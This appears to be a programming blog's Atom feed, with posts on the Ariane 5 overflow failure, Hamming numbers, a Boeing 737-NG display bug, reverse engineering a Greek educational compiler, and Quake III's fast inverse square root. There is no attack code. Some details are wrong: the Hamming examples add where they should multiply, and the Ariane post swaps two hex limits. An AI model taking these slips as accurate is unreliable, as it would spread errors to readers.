+<p>But on June 4, 1996, at the Guiana Space Centre, located on an overseas region of France in South America, during what was supposed to be a routine launch, disaster struck. Just thirty-six seconds into the flight, a tiny flaw in the code caused set off a chain reaction, halting the inertial navigation system, surrendering the rocket to intense aerodynamic forces. Consequently, the rocket veered 90 degrees off course, invoking the self-destruct mechanism leading to a massive explosion.</p>
+<p><a href="https://www.openstreetmap.org/?mlat=5.239703070014162&amp;mlon=-52.76889940050002&amp;zoom=17#map=17/5.239703/-52.768899">https://www.openstreetmap.org/?mlat=5.239703070014162&amp;mlon=-52.76889940050002&amp;zoom=17#map=17/5.239703/-52.768899</a></p>
+<p><strong>Thankfully, no humans were harmed</strong> as the rocket was carrying a constellation of four European Space Agency research satellites, the “Cluster“.</p>
+<p>The failure line of code was the last line below, written in ADA :</p>
+<pre><code>L_M_BV_32 := TBD.T_ENTIER_16S((1.0 / C_M_LSB_BH) * G_M_INFO_DERIVE(T_ALG.E_BH));
+
+
+if L_M_BV_32 &gt; 32767 then
+	P_M_DERIVE(T_ALG.E_BV) := 16#7FFF#;
+elseif L_M_BV_32 &lt; -32768 then
+	P_M_DERIVE(T_ALG.E_BV) := 16#8000#;
+else
+	P_M_DERIVE(T_ALG.E_BV) := UC_16S_EN_16NS(TBD.T_ENTIER_16S(L_M_BV_32));
+end if;
+
+P_M_DERIVE(T_ALG.E_BH) := UC_16S_EN_16NS(TBD.T_ENTIER_16S((1.0 / C_M_LSB_BH) *G_M_INFO_DERIVE(T_ALG.E_BH));
+</code></pre>
+<p>The error was an overflow of memory limit set for the variable <code>T_ALG.E_BH</code>.</p>
+<p>Both variables T_ALG.E_BV and T_ALG.E_BH represents the velocity of the rocket.T_ALG.E_BVdoes it for vertical velocity (thus ends in “V”) and T_ALG.E_BH for horizontal (thus ends in “H”).</p>
+<p>Since those two variables were signed 16-bit type, that meant that they could hold from number -32768 until 32767. It’s just how things are for this type of variables. Any attempt to store a smaller or greater number would result in a memory overflow and a crash, like the ones that happen to your personal computer as well from time to time.</p>
+<p>In the code, we can easily see that an overflow case is correctly managed for variable <code>T_ALG.E_BV</code> from the line if L_M_BV_32 &gt; 32767 then until end if; below it. All that happens there actually is that :</p>
+<ul>
+<li>if the value to be assigned toT_ALG.E_BVis smaller than -32768, it would take -32768 (or <code>16#7FFF#</code> in hexadecimal numbering system)</li>
+<li>if the value to be assigned toT_ALG.E_BVis greater than 32767, it would take 32767 (or <code>16#8000#</code> in hexadecimal numbering system)</li>
+</ul>
+<p>So simple !</p>
+<p>All great for <code>T_ALG.E_BV</code> but for <code>T_ALG.E_BH</code> things were different : it’s completely on it’s own luck.</p>
+<p>It was the bigger scale of Ariane 5, compared to Ariane 4, that resulted in that number stored directly on <code>T_ALG.E_BH</code> actually to reach a value greated than 32767, revealing this tiny mistake of not handling that case for this variable as well by… a huge explosion.</p>
+<p>Following the accident, they resolved the issue quite simply removing the scandalous line and by copying &amp; pasting the same code for <code>T_ALG.E_BV</code> to do the same thing for <code>T_ALG.E_BH</code> as well.</p>
+<pre><code>L_M_BV_32 := TBD.T_ENTIER_16S((1.0 / C_M_LSB_BH) * G_M_INFO_DERIVE(T_ALG.E_BH));
+
+if L_M_BV_32 &gt; 32767 then
+ P_M_DERIVE(T_ALG.E_BV) := 16#7FFF#;
+elseif L_M_BV_32 &lt; -32768 then
+ P_M_DERIVE(T_ALG.E_BV) := 16#8000#;
+else
+ P_M_DERIVE(T_ALG.E_BV) := UC_16S_EN_16NS(TBD.T_ENTIER_16S(L_M_BV_32));
+end if;
+
+L_M_BH_32 := TBD.T_ENTIER_16S((1.0 / C_M_LSB_BH) * G_M_INFO_DERIVE(T_ALG.E_BH));
+
+if L_M_BH_32 &gt; 32767 then
+ P_M_DERIVE(T_ALG.E_BH) := 16#7FFF#;
+elseif L_M_BH_32 &lt; -32768 then
+ P_M_DERIVE(T_ALG.E_BH) := 16#8000#;
+else
+ P_M_DERIVE(T_ALG.E_BH) := UC_16S_EN_16NS(TBD.T_ENTIER_16S(L_M_BH_32));
+end if;
+</code></pre>
+<p>The Ariane Flight V88 is a great example of how memory safety is a field with lot of work that needs to be done.</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hamming Numbers]]></title>
+        <id>https://blog.simplecode.gr/posts/hamming-numbers/</id>
+        <link href="https://blog.simplecode.gr/posts/hamming-numbers/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Hamming Numbers]]></summary>
+        <content type="html"><![CDATA[<p>Hamming numbers, or ugly numbers, or smooth numbers, is a sequence of numbers that they can be produced by:</p>
+<pre><code>2^x * 3^y * 5^z
+</code></pre>
+<p>Where x, y, z &gt;= 0</p>
+<p>For example:</p>
+<ul>
+<li>2, is a hamming number, since: 2^1 + 3^0 + 5^0 = 2.</li>
+<li>25, is a hamming number, since: 2^0 + 3^0 + 5^2 = 25.</li>
+</ul>
+<p>It is a sequence that follows a predictable, controllable pattern of incrementation due to their specific structure. It looks like that:</p>
+<pre><code>1, 2, 3, 4, 5, 6, 8, 9, 10, 12, 15, 16, 18, 20, 24, 25, 27, 30, 32, 36, …
+</code></pre>
+<p>They origin from punched card readers.</p>
+<p>In 1950, Richard W. Hamming was working on Bell Labs (home of Unix and many other great inventions), where he got frustrated of the errors of the punched card reader. Soon, he started working on several error-correcting codes, most notably the Hamming(7,4) code which is used in many aspects of today's life. A fruit of his labour was the Hamming sequence — or hamming numbers.</p>
+<p>Famous they became by Edsger W. Dijkstra, an honorable computer scientist (famous for Dijkstra’s algorithm).
+In his book <em>Discipline of Programming</em>, on the 17th chapter, named <em>AN EXERCISE ATTRIBUTED TO R.W. HAMMING</em>, Dijkstra travels across the beauty of hamming numbers.
+This made hamming numbers a hot topic in academia.</p>
+<p>The beauty of those numbers is that they consist of the multiplication of 2, 3, and 5 raised to some powers (2^x * 3^y * 5^z). This means they are very easy to factor, simple to manipulate, and portable.</p>
+<p>Factoring a number is when you split it down to other numbers, which if you multiply them, you get that number. For example factoring 100 can look like this:</p>
+<pre><code>100 / 2 = 50, no remainder, prime factors: [2]
+50 / 2 = 25, no remainder, prime factors: [2, 2]
+25 / 2 = 12.5, has remainder, we try next number
+25 / 3 = 8.33, same
+25 / 4 = 6.25, same
+25 / 5 = 5, no remainder, prime factors: [2, 2, 5]
+5 / 2 = 2.5, has remainder, we try next number
+5 / 3 = 1.66, same
+5 / 4 = 1.25, same
+5 / 5 = 1, no remainder, prime factors: [2, 2, 5, 5]
+We reached 1 so we stop
+</code></pre>
+<p>And indeed 2 * 2 * 5 * 5 = 100.</p>
+<p>If a number can’t be factored, then it’s a prime number. It can be divided only by 1 and itself.</p>
+<p>100 is a hamming number as well, since we can symbolize it as, based on the above, 2^2 * 3^0 * 5^2.</p>
+<p>And if factorizing a number like 100 to 2 * 2 * 5 * 5 or 2^2 * 3^0 * 5^2 seems like making our lives harder, think that the same we can do for numbers like 262440000000, which is 2^9 * 3^8 * 5^7. It’s now much easier to transmit over a bad network “9, 8, 7” than this huge number.</p>
+<p>At this point, we can call hamming numbers as “easy to factor numbers”, because they consist only of 3 prime numbers: 2, 3, 5.
+There are numbers that can’t be constructed of the numbers 2, 3 and 5 and they require other prime numbers as well, like 7: those are not hamming numbers and are harder to factor as well.</p>
+<p>Hamming numbers, are “easy to divide numbers” as well. Being built only from small prime factors (2, 3, and 5), they are more likely to be divisible by a range of commonly needed factors than a completely random number.</p>
+<p>Many algorithms rely on factoring to reduce complexity. Providing numbers that are easy to factor, reduces complexity even more and can play a crucial role into making things faster or even possible.</p>
+<p>Using Hamming numbers doesn’t do the factorization, but guarantees that the factorization or de-factorization will be easy and fast. It also provides more easily divisible numbers, compared to using random numbers.</p>
+<hr />
+<h3>Metrics</h3>
+<p>The difference is crazy. Thanks to the code provided to this Git, which provides Go functions to:</p>
+<ul>
+<li>find if x is a hamming number</li>
+<li>find next hamming number after x</li>
+<li>generate a list of hamming numbers of length n</li>
+<li>factorize a given number x (util)</li>
+<li>measure the time a function took to execute (high-order, util)</li>
+</ul>
+<p><a href="https://github.com/rept0id/hamming-numbers">https://github.com/rept0id/hamming-numbers</a></p>
+<p>We can see the difference in time it takes to factorize a hamming number and a not-hamming number.</p>
+<ul>
+<li>51200000 is a hamming number.</li>
+<li>51200001 is NOT a hamming number.</li>
+<li>µs is microseconds</li>
+<li>ms is milliseconds (1000µs)</li>
+</ul>
+<p>The result for my machine (AMD A4-5300, but any CPU would behave similarly) are:</p>
+<pre><code>go build
+./hamming
+Time taken to factorize 51200000: 38.255µs
+Time taken to factorize 51200001: 1.013663ms
+</code></pre>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[When Boeing 737-NG Screens Went Blank During Landings on Perfectly Horizontal Runways]]></title>
+        <id>https://blog.simplecode.gr/posts/when-boeing-737-ng-screens-went-blank-during-landings-on-perfectly-horizontal-runways/</id>
+        <link href="https://blog.simplecode.gr/posts/when-boeing-737-ng-screens-went-blank-during-landings-on-perfectly-horizontal-runways/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[When Boeing 737-NG Screens Went Blank During Landings on Perfectly Horizontal Runways]]></summary>
+        <content type="html"><![CDATA[<p>The pilots of the new Boeing 737-NG, around 2019-2020, encountered a particularly vexing issue: all six display units would go blank during landings at certain airports, including:</p>
+<ul>
+<li>La Mina, La Guajira, Colombia</li>
+<li>Barrow, Alaska, USA</li>
+<li>Pine Bluffs, Wyoming, USA</li>
+<li>Wayne County, Ohio, USA</li>
+<li>Chippewa County, Michigan, USA</li>
+<li>Cavern City, New Mexico, USA</li>
+<li>Cheddi Jagan, Georgetown, Guyana</li>
+</ul>
+<p>Since the Boeing codebase is closed-source, the exact cause of the issue remains unknown. We only know the nature of the bug, the timeframe in which it occurred, and that it has since been resolved. Thus, we can only speculate about the details.</p>
+<p>…So, let our imaginations take flight !…</p>
+<p>First of all, let’s consider the airports themselves. These locations form our sample space.</p>
+<p>If we examine the airports on maps, we will find a common factor: each of these airports has at least one perfectly horizontal runway!</p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=16/11.2342/-72.4913">La Mina, La Guajira, Colombia</a></p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=14/71.2856/-156.7695">Barrow, Alaska, USA</a></p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=16/41.1507/-104.1349">Pine Bluffs, Wyoming, USA</a></p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=16/40.8744/-81.8877">Wayne County, Ohio, USA</a></p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=16/46.2548/-84.4747">Chippewa County, Michigan, USA</a></p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=16/32.3422/-104.2601">Cavern City, New Mexico, USA</a>
+(a horizontal runway is located in the middle of the map)</p>
+<p><a href="https://www.openstreetmap.org/?ref=blog.simplecode.gr#map=16/6.4988/-58.2571">Cheddi Jagan, Georgetown, Guyana</a>
+(a horizontal runway is located in the middle of the map)</p>
+<p>If all the aforementioned airports have a runway that is perfectly horizontal—meaning it forms a 270 or 90-degree angle, depending on the approach direction—then we can hypothesize about the issue by identifying mathematical functions :</p>
+<pre><code>( f ) where ( f(x) = 0 ) for ( x = 270° ) or ( x = 90° )
+</code></pre>
+<p>One such function is the very simple : <code>f(x) = 1 / cos(x)</code></p>
+<p>That, because :</p>
+<pre><code>cos(270°) = 0
+
+cos(90°) = 0
+</code></pre>
+<p>So, we end up with :</p>
+<pre><code>f(270°) = 1 / cos(270°) = 1/0
+
+f(90°) = 1 / cos(90°) = 1/0
+</code></pre>
+<p>And division by 0 is impossible.</p>
+<p>In this scenario, the Boeing 737-NG’s software may have crashed, causing the screens to turn off on these perfectly horizontal runways. However, we don’t truly know the reason, and the above is merely one of many possible assumptions we can make using our imagination and the given context.</p>
+<p>Below is the U.S.A. Federal Aviation Administration’s record of the bug:</p>
+<p>The FAA received reports earlier this year of three incidents of display electronic unit (DEU) software errors on Model 737 NG airplanes flying into runway PABR in Barrow, Alaska. All six display units (DUs) blanked with a selected instrument approach to a runway with a 270-degree true heading, and all six DUs stayed blank until a different runway was selected <a href="https://www.federalregister.gov/documents/2019/12/27/2019-27966/airworthiness-directives-the-boeing-company-airplanes?ref=blog.simplecode.gr">(source)</a>.</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hello World !]]></title>
+        <id>https://blog.simplecode.gr/posts/hello-world/</id>
+        <link href="https://blog.simplecode.gr/posts/hello-world/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[This is a hello world article.]]></summary>
+        <content type="html"><![CDATA[<p>Hello world !</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[When is a program good ? Reverse engineering HOU’s compiler]]></title>
+        <id>https://blog.simplecode.gr/posts/when-is-a-program-good-reverse-engineering-hous-compiler/</id>
+        <link href="https://blog.simplecode.gr/posts/when-is-a-program-good-reverse-engineering-hous-compiler/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[When is a program good ? Reverse engineering HOU’s compiler]]></summary>
+        <content type="html"><![CDATA[<p>At the university I’m attending, Hellenic Open University, they have developed, years ago, a custom programming language and a custom compiler for it. The language is ok, feels a bit like Pascal and the commands are all in Greek. For example:</p>
+<pre><code>ΑΛΓΟΡΙΘΜΟΣ ΔΟΚΙΜΗ
+	ΔΕΔΟΜΕΝΑ x:INTEGER;
+ΑΡΧΗ
+	ΤΥΠΩΣΕ ("PLEASE ENTER A NUMBER: ", EOLN);
+	ΔΙΑΒΑΣΕ (x);
+	ΤΥΠΩΣΕ ("YOU GAVE: ", x, EOLN)
+ΤΕΛΟΣ
+</code></pre>
+<p>The compiler on the other hand… is one of the worst compilers I’ve used ever. It’s very buggy and it’s also having millions of encoding problems which originate from the fact that it expects files to be in Windows-1253 encoding while most editors nowadays use UTF-8. It’s a compiler you can use, but it doesn’t fit its purpose. So it’s bad.</p>
+<p>What I mean by this is that there is a way to use this compiler: use Notepad++ and constantly check if your encoding is Windows-1253; workaround the compiler’s bugs by writing your code with the same logic but a bit differently. All this makes coding in that language and using this compiler harder than coding in C, which is touted later and is considered harder… oh sweet summer child, if you only knew (!!! 😂 !!!).</p>
+<p>But the purpose of this compiler was to be introducing and easy, so this compiler has failed its purpose for good. And it’s not only me who will say this. Aristotle argued that something is good when it fulfills its “τέλος” (purpose or function), so there are good chances Aristotle would consider this compiler “bad”.</p>
+<p>As a cherry on top, this compiler doesn’t work on Linux. So it’s trash.</p>
+<hr />
+<p>It was clear that something needed to be done with this compiler.</p>
+<p>I managed to get this compiler to work on Linux after lots of tweaking with the “wine” compatibility tool and because I didn’t want anyone else to go through all this, I made a public repository with a ready solution. You can find everything here:
+<a href="https://github.com/rept0id/hou-compiler-linux/">https://github.com/rept0id/hou-compiler-linux/</a></p>
+<p>This “wine” solution makes using this compiler on Linux not only possible but actually better than it is on other platforms. This is because before it runs the compiler and the produced executable through wine, it also encodes the provided file from UTF-8 to Windows-1253.</p>
+<p>This way, you write with a sane person’s tools, you know, the average editor of the simple layman out there that uses UTF-8, and then another file with the same content but Windows-1253 gets created and provided to the compiler. But you don’t care about the other file as it’s just a middle step. You write UTF-8.
+Now you can focus on your code instead of the encodings.</p>
+<hr />
+<p>This solution mentioned above is “good” (by Aristotle) but it’s not “perfect” (by me, even though Aristotle’s opinion matters more). Because something with this compiler and wine bugs, if you try to print Greek characters through your program it will display them wrong (as a workaround, use Greek with Latin characters, Greeklish, or just English).</p>
+<p>Such a thing is very annoying for a compiler and whole concept meant to work with Greek. This actually still makes the program “not good” by Aristotle. This must be fixed as well, else the solution is not perfect. I believe there are 2 ways to fix this: one is to keep fuck-around-find-out with Wine and the second is to reverse engineer this compiler totally and make a better one. Guess which one I find more fun!</p>
+<hr />
+<p>First step into reverse engineering was to throw this compiler into a classic .NET reverse engineering tool, like .NET Reflector and the newer DotPeek, because only those ones I knew from a friend.</p>
+<p>Actually, .NET is the best case of reverse engineering a program because the code that you write in C#, VB, F# or whatever, gets transposed into bytecode for “Common Language Runtime” which is considered easier to reverse engineer than raw binary machine code.</p>
+<p>Those tools, if the code is not “obfuscated” against them, will give you a very good result. This bytecode thing makes me consider all those languages to be in the same basket as Java; even though they don’t claim that they run inside a VM, they aaalmost do something that could be labeled as similar.</p>
+<p>Turns out this compiler is not a .NET program and I couldn’t get something out of using those tools.</p>
+<hr />
+<p>Next step was to guess better what this program was made with. I ran</p>
+<pre><code>strings ./pli10.exe
+</code></pre>
+<p>in a Linux terminal and saw a little bit the result. I saw many “GCC” (filtered with <code>strings ./pli10.exe | grep "GCC"</code>), and made a conclusion that this may be a C/C++ program, since GCC is a C compiler.</p>
+<p>I can’t be 100% sure as this compiler uses tdm-gcc to generate the machine code, so maybe it’s written in something different than C/C++ and it just calls the GCC compiler.</p>
+<p>So I had to do what any programmer that likes math would have done and say the poem:
+“let’s assume this program is C/C++” and continue based on this.</p>
+<hr />
+<p>I didn’t know any good C/C++ disassembler so ChatGPT and Google were my friends and I found that actually there are out there 2 very good ones:</p>
+<ul>
+<li>Ghidra, made by NSA</li>
+<li>Interactive Disassembler (IDA), made by Ilfak Guilfanov</li>
+</ul>
+<p>I managed to get Ghidra and disassemble the compiler back to code. But still, I wasn’t able yet to find many things. Not yet.</p>
+<p>By the way, Ghidra can disassemble other languages too like Go and Rust as far as I’ve read.</p>
+<hr />
+<p>Still, the journey doesn’t end here, as I’ve already found a line that is very interesting:</p>
+<pre><code>system("chcp 1253 &gt; nul");
+</code></pre>
+<p>Maybe this program could work much better if this legacy Windows-1253 encoding wasn’t enforced.</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[The 14 lines of code that revolutionized 3D graphics - Fast Inverse Square Root]]></title>
+        <id>https://blog.simplecode.gr/posts/the-14-lines-of-code-that-revolutionized-3d-graphics-fast-inverse-square-root/</id>
+        <link href="https://blog.simplecode.gr/posts/the-14-lines-of-code-that-revolutionized-3d-graphics-fast-inverse-square-root/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[The 14 lines of code that revolutionized 3D graphics - Fast Inverse Square Root]]></summary>
+        <content type="html"><![CDATA[<p>For a computer, a three-dimensional space is a collection of triangles. In older 3D video games, this was noticeable and everything seemed a bit triangular. This was because, in order to accommodate older hardware, they had to reduce the number of triangles. Nowadays, there are more triangles, so there is more detail and things don’t seem triangular in modern video games – but deep inside, they still are.</p>
+<p>Usually, computers treat media as pixels. An image is nothing but a collection of pixels. However, in 3D graphics, it’s more efficient to treat everything as triangles. With triangles, you can manipulate their angles and adjust shapes as someone moves within a 3D space.</p>
+<p>Apart from what’s happening in front of the scene, some trigonometry is still needed behind the scenes for 3D worlds. Light and reflection are among the most important elements. For computers, light can also be thought of as a triangle. As light hits a surface and bounces, it creates a “V,” which is like a triangle without one side.</p>
+<p>It makes sense that geometry plays a significant role in 3D graphics in computing. And as we all know, the most favored shape in geometry is the triangle.</p>
+<p>The number of triangles in a 3D world is unbelievably high, and the better the graphics, the more millions of triangles there are. All those triangles are recalculated with every screen refresh and every movement of the player, all simultaneously. This is manageable because a computer’s job is to perform many calculations. However, the calculations are so numerous that we need a dedicated piece of hardware for them: the graphics card.</p>
+<p>Even though humanity created dedicated hardware for these calculations, that alone wasn’t enough, and the calculations had to be optimized. We had to find ways to perform our calculations more intelligently and faster so we could handle more of them simultaneously, resulting in more triangles and better, smoother graphics accessible to more people without requiring them to spend a fortune on hardware. We had to think like Linux.</p>
+<p>That’s where the best hack came into play: the “Fast Inverse Square Root,” which calculates the inverse of a square root in a clever way. It doesn’t actually perform the full calculations to get the exact value but uses a trick that works very well and gets an approximate value. Later, it uses a formula by Newton to verify if this approximation is accurate.</p>
+<h3>What it does and why</h3>
+<p>The Fast Inverse Square Root calculates ( f(x) = 1 / √(x) ) much faster.</p>
+<p>It was first publicly noticed for its use in Quake III, primarily to compute the reflections of light—crucial for video games, especially shooters where guns emit additional light. Nevertheless, even in non-shooter games, a 3D world without light isn’t feasible because clear visibility is impossible in a dark room, mirroring reality.</p>
+<p>When dealing with light reflection, especially in computer graphics, it’s often necessary to normalize vectors. Vectors are the triangles we referred to before. Normalization is scaling the vector to a smaller size while keeping its direction.</p>
+<p>The formula to normalize can be simplified to:</p>
+<pre><code>normalized(v) = v * (1 / ∥v∥)
+</code></pre>
+<p>And it’s the 1 / ∥v∥ part where the fast inverse square root comes to help, simply because</p>
+<pre><code>∥v∥ = √(n1² + n2² + … + nn²)
+</code></pre>
+<p>For example, the vector v = (3,4,0) can be normalized by:</p>
+<hr />
+<p><strong>Context:</strong></p>
+<pre><code>v = (3,4,0),
+normalized(v) = v * (1 / ∥v∥)
+</code></pre>
+<hr />
+<p><strong>Calculate ||v|| to simplify the normalization term:</strong></p>
+<pre><code>normalized(v) = v * (1 / ∥v∥) =&gt;
+normalized(v) = v * (1 / sqrt((3²) + (4²) + (0²))) =&gt;
+normalized(v) = v * (1 / sqrt(25))
+</code></pre>
+<hr />
+<p><strong>Substitute (1 / sqrt(25)) with fast_inverse_square_root(25):</strong></p>
+<pre><code>normalized(v) = v * fast_inverse_square_root(25)
+</code></pre>
+<hr />
+<p><strong>Evaluate fast_inverse_square_root(25) which returns 0.2:</strong></p>
+<pre><code>normalized(v) = v * 0.2
+</code></pre>
+<hr />
+<p><strong>Simplify 0.2 which is the same as (1/5):</strong></p>
+<pre><code>normalized(v) = v * (1/5)
+</code></pre>
+<hr />
+<p><strong>Replace v with its actual value (vector):</strong></p>
+<pre><code>normalized(v) = (3,4,0) * (1/5)
+</code></pre>
+<hr />
+<p><strong>(vector * x) =&gt; (each value of the vector * x), so:</strong></p>
+<pre><code>normalized(v) = ((3 * (1/5)), (4 * (1/5)), (0 * (1/5))) =&gt;
+normalized(v) = (3/5, 4/5, 0/5)
+</code></pre>
+<hr />
+<h3>Original Code</h3>
+<p>This is the original C code from Quake III, one of the earliest—if not the very first—pioneers of the Fast Inverse Square Root. The year was 1999…</p>
+<pre><code>float Q_rsqrt(float number)
+{
+    long i;
+    float x2, y;
+    const float threehalfs = 1.5F;
+
+    x2 = number * 0.5F;
+    y = number;
+    i = * ( long * ) &amp;y; // evil floating point bit level hacking
+    i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck?
+    y = * ( float * ) &amp;i;
+    y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration
+    // y = y * ( threehalfs - ( x2 * y * y ) ); // 2nd iteration
+
+    return y;
+}
+</code></pre>
+<hr />
+<h3>Breakdown of the Original Code</h3>
+<p>Here’s what happens on those lines: at the beginning, we define our function and its variables. You can ignore this part.</p>
+<pre><code>float Q_rsqrt(float number)
+{
+    long i;
+    float x2, y;
+    const float threehalfs = 1.5F;
+</code></pre>
+<p>Then, we calculate some values we’ll need for Newton’s formula, which will be explained later. You can ignore this part for now.</p>
+<pre><code>    x2 = number * 0.5F;
+    y = number;
+</code></pre>
+<p>Next, we define the size of the variable i. This variable plays a key role in the algorithm’s core line, which is the line following this one.
+Look closely.</p>
+<p>Even though “i” is a variable of type long, which is a type for simple numbers (1, 2, 3, 4), it is taking the exact value of “y”, which has the value of “number”, which is the given value we try to calculate for. However, even though “i” is long, it’s ending up with the bits of the variable “number”, which is a float. We save the bits of a “float” to a “long”. This is preparation for the next line.</p>
+<pre><code>    i = * ( long * ) &amp;y;
+</code></pre>
+<p>This line, which we’ll call the “core line,” is the heart of our algorithm. We’ll break it down later to see how it calculates the inverse square root of a given number. This is the most important part.</p>
+<pre><code>    i = 0x5f3759df - ( i &gt;&gt; 1 );
+</code></pre>
+<p>Next, we define the size of the variable y. This variable is used in the calculation for Newton’s formula. We assign the value of i (from the core line) to y and then perform the calculations. Newton’s formula essentially refines our initial calculation. We’ll explore Newton’s formula in more detail later.
+You can ignore this part for now.</p>
+<pre><code>    y = * ( float * ) &amp;i;
+    y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration
+    // y = y * ( threehalfs - ( x2 * y * y ) ); // 2nd iteration
+</code></pre>
+<p>At the end, we are just returning the value y, which is the value i we found from the core line, calibrated and validated through Newton’s formula. Ignore.</p>
+<pre><code>    return y;
+}
+</code></pre>
+<hr />
+<h3>Breakdown of the “Core Line”</h3>
+<p>This is the “core line” as we saw on the original code:</p>
+<pre><code>i = 0x5f3759df - ( i &gt;&gt; 1 );
+</code></pre>
+<ul>
+<li><code>0x5f3759df</code> is just a magic number.</li>
+<li>It’s literally a magic number hard-coded there, that just does the trick.</li>
+<li>It’s in hexadecimal numbering system format.</li>
+<li>In binary it is <code>01011111001101110101100111011111</code>.</li>
+<li><code>(i &gt;&gt; 1)</code> is binary shift to the right by one.</li>
+<li>Look closely at this example:
+If we perform a binary shift to the right by one on the value
+<code>01000000100000000000000000000000</code>, we end up with
+<code>00100000010000000000000000000000</code>.</li>
+<li>As you can see, all the bits move one position to the right. We add a 0 at the beginning (leftmost position) to maintain the same size during the shift. The least significant bit (rightmost position), which was also 0, is discarded to keep the overall length unchanged. In this specific case, discarding the last 0 took place but it’s not noticeable because it was just another zero.</li>
+</ul>
+<hr />
+<h3>“Core Line” by hand, example</h3>
+<p>Let’s see an example of how we could do these operations by hand, using just an online binary calculator to make our lives easier.</p>
+<p>We are going to calculate the fast inverse square root for 4, so we actually try to calculate 1 / sqrt(4).</p>
+<ul>
+<li>Our i is going to be the number 4, and in binary normally 4 is just <code>100</code> BUT, be careful, as in the fast inverse square root algorithm, the i contains the bits of a float. So we need to convert 4 to float, which is much different and it’s <code>01000000100000000000000000000000</code> in binary. The use of a floating point calculator (like this) is strongly suggested. We talk about types later.</li>
+<li>The magic number we encountered earlier, <code>0x5f3759df</code> in hexadecimal notation, translates to <code>01011111001101110101100111011111</code> in binary. It’s the same value represented in a different numerical system (binary instead of hexadecimal). Using binary will simplify the upcoming example.</li>
+<li>Our formula is:</li>
+</ul>
+<pre><code>rsqrt = magic – (i &gt;&gt; 1)
+</code></pre>
+<p>and it’s based on the core line.</p>
+<pre><code>rsqrt = magic – (01000000100000000000000000000000 &gt;&gt; 1)   // i is 4, float in type
+</code></pre>
+<p>If we use a floating point calculator to binary, 4 as a float in binary is:</p>
+<pre><code>01000000100000000000000000000000
+</code></pre>
+<pre><code>rsqrt = magic – 00100000010000000000000000000000   // (i &gt;&gt; 1) symbolizes binary shift to the right by 1. We apply it.
+</code></pre>
+<p><code>01000000100000000000000000000000</code> becomes <code>00100000010000000000000000000000</code></p>
+<pre><code>rsqrt = 01011111001101110101100111011111 – 00100000010000000000000000000000   // We simply replaced magic with its value.
+</code></pre>
+<pre><code>rsqrt = 00111110111101110101100111011111   // We simply did the binary subtraction using an online binary calculator.
+</code></pre>
+<p>The result is that for x = 4, the inverse square root is <code>00111110111101110101100111011111</code> in binary, or approximately <code>0.48310754</code> in decimal, if we simply use a binary to decimal online converter.
+And actually, 1 / sqrt(4) = 0.5, which is very close to 0.483.</p>
+<hr />
+<h3>Types</h3>
+<p>It’s very important to note that fast inverse square root algorithm is tricking around the floating-point arithmetic, which is the arithmetic system where such trick works.</p>
+<p>If you try to convert those numbers in decimals or not follow the types exactly as they are, it’s not going to work.</p>
+<p>So if you are doing it programmatically, you need to be careful to the fact that <code>i</code> must be a value of type <code>long</code> but it has to contain the bits of a float number!
+It needs to be <code>long</code> in order for the binary shift to work properly, while it needs to contain the bits of a float because the trick is actually possible only in floating-point arithmetic.</p>
+<p>In the code, we start with a float, <code>number</code>:</p>
+<pre><code>float Q_rsqrt(float number)
+</code></pre>
+<p>We copy the value of the float <code>number</code> to the float <code>y</code>:</p>
+<pre><code>y = number;
+</code></pre>
+<p>And then, this is the hackish part, we save the bits of the <code>y</code> float to <code>i</code> long.
+This trick is called “type punning”.</p>
+<pre><code>i = * ( long * ) &amp;y;
+</code></pre>
+<p>For example, the 4 looks like that in binary: <code>100</code>. But the 4 looks like that as a float, in binary: <code>01000000100000000000000000000000</code>. That’s because in a 32-bit float, the first bit is the sign (if the number is negative or positive), the next 8 bits are the exponent (power) and the next 23 bits are the mantissa (adjustment). Float is a special type to save decimals that does all this in order to save memory.</p>
+<p>So, <code>01000000100000000000000000000000</code> means: “positive” “2^2” plus “zero” adjustment.</p>
+<p>The types must be like that, because this is the recipe of fast inverse square root.</p>
+<p>If you want to do calculations by hand, the use of a floating point calculator (like this) is strongly suggested.</p>
+<hr />
+<h3>Magic Number Origin</h3>
+<p>One of the most interesting aspects is that the origin of this magic number isn’t documented. We have to accept it for now, similar to π = 3.14.</p>
+<table>
+<thead>
+<tr>
+<th>Hexadecimal</th>
+<th>Binary</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x5f3759df</td>
+<td>01011111001101110101100111011111</td>
+</tr>
+</tbody>
+</table>
